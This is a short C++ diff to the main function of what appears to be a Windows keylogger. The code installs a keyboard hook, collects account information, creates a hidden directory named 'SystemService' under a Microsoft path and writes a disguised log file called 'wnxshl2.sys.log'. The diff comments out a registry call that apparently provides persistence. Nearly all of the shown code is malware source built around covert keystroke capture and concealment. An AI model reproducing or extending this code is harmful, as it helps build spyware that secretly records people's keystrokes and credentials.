@@ -21,12 +21,12 @@ int main() {
 	return 0;
   }
 
-  Sys::AddToRegistry();
+//  Sys::AddToRegistry();
   KeyHook::InstallHook();
   Stream::GetAccountInfo(clientInfo);
 
   std::string path = Stream::GetPath("\\Microsoft\\");
-  BDirectory mainDir;
+  Directory mainDir;
   Stream::LogFile logFile;
 
   mainDir.name = "SystemService";
@@ -35,7 +35,7 @@ int main() {
   debn(Stream::GetPath("\\Microsoft\\" + mainDir.name))
 
   Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
-  logFile = Stream::MakeFile("wnxshl2.sys.log", "\\Microsoft\\"); // Logs
+  Stream::MakeFile("wnxshl2.sys.log", "\\Microsoft\\"); // Logs
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);
 
   std::ostringstream ostream;
